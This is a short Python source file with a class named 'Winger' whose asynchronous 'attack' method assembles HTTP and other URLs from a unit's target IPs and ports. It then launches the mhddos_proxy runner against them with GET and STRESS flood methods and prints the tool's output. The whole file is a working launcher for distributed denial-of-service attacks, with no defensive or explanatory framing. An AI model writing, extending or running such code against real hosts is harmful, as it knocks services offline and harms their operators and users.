import shlex
import sys
import asyncio
from spam_units import Unit


class Winger:
    def __init__(self, unit: Unit):
        self.unit = unit

    async def attack(self):
        urls = []
        for ip in self.unit.ips:
            for port in ip.ports:
                url = ip.address + ":" + port.number
                if port.protocol == 'http':
                    urls.append('https://' + url)
                urls.append(port.protocol + '://' + url)

        cmd = [sys.executable, './mhddos_proxy/runner.py'] + urls + [
            '-p',
            '1200',
            '--http-methods',
            'GET',
            'STRESS',
            # '--debug'
        ]

        proc = await asyncio.create_subprocess_shell(
            shlex.join(cmd),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT
        )

        while True:
            line = await proc.stdout.readline()
            if not line:
                break
            print(f'{line.decode().rstrip()}')

        await proc.wait()
